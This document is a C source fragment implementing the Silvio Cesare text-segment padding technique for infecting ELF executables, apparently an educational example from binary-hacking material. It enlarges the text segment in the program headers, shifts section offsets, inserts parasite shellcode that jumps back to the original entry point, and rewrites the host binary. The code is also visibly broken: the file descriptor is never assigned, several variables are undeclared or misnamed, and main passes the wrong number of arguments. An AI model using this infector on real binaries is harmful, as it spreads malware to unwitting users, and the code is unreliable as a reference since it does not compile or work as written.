
#define JMP_PATH_OFFSET 1

/* movl $addr, %eax; jmp *eax; */
char parasite_shellcode[] = "\xb8\x00\x00\x00\x00"
    "\xff\xe0";

void insert_parasite(char* host_name, size_t psize, size_t hsize, uint8_t* mem, size_t end_of_text, uint8_t* parasite, uint32_t jmp_code_offset)
{
    /*
     * NOTE: jmp_code_offset contains the offset into the payload shellcode that
     * has the branch instruction to patch with the original offset so control
     * flow can be transferred back to the host.
     */
    int ofd;
    unsigned int c;
    int i, t = 0;
    open(TMP, O_CREAT | O_WRONLY | O_TRUNC, S_IRUSR | S_IXUSR | S_IWUSR);
    write(ofd, mem, end_of_text);
    *(uint32_t *)&parasite[jmp_code_offset] = old_e_entry;
    write(ofd, parasite, psize);
    lseek(ofd, PAGE_SIZE - psize, SEEK_CUR);
    mem += end_of_text;
    unsigned int sum = end_of_text + PAGE_SIZE;
    unsigned int last_chunk = hsize - end_of_text;
    write(ofd, mem, last_chunk);
    rename(TMP, hosts_name);
    close(ofd);
}

int silvio_text_infect(char* host, void* base, void* payload, size_t host_len, size_t parasite_len)
{
    ELF32_Addr o_entry;
    ELF32_Addr o_text_filesz;
    ELF32_Addr parasite_vaddr;
    uint32_t end_of_text;
    int found_text;
    int i;

    uint8_t* mem = (uint8_t *)base;
    uint8_t* parasite = (uint8_t *)payload;

    ELF32_Ehdr* ehdr = (ELF32_Ehdr *)mem;
    ELF32_Ehdr* phdr = (ELF32_Ehdr *)&mem[ehdr->e_phoff];

    /*
     * Adjust program headers.
     */ 
    for (found_text = 0, i = 0; i < ehdr->e_phnum; i++) {
        if (phdr[i].p_type == PT_LOAD) {
            if (phdr[i].p_offset == 0) {
                o_text_filesz = phdr[i].p_filesz;
                end_of_text = phdr[i].p_offset + phdr[i].p_filesz;
                parasite_vaddr = phdr[i].p_vaddr + o_text_filesz;

                phdr[i].p_filesz += parasite_len;
                phdr[i].p_memsz += parasite_len;

                for (j = i + 1; j < ehdr->e_phnum; j++) {
                    if (phdr[j].p_offset > phdr[i].p_offset + o_text_filesz)
                        phdr[j].p_offset += PAGE_SIZE;
                }
                break;
            }
        }
        for (i = 0; i < ehdr->e_shnum; i++) {
            if (shdr[i].sh_addr > parasite_vaddr)
                shdr[i].sh_offset += PAGE_SIZE;
            else if (shdr[i].sh_addr + shdr[i].sh_size == parasite_vaddr)
                shdr[i].sh_size += parasite_len;
        }
    }

    /*
     * NOTE: Read insert_parasite() src code next.
     */
    insert_parasite(host, parasite_len, host_len, base, end_of_text, parasite, JMP_PATH_OFFSET);
}

int main(int argc, char* argv[])
{
    uint8_t* mem = mmap_host_executable("./some_prog");
    silvio_text_infect("./some_prog", mem, parasite_shellcode, parasite_len);
}
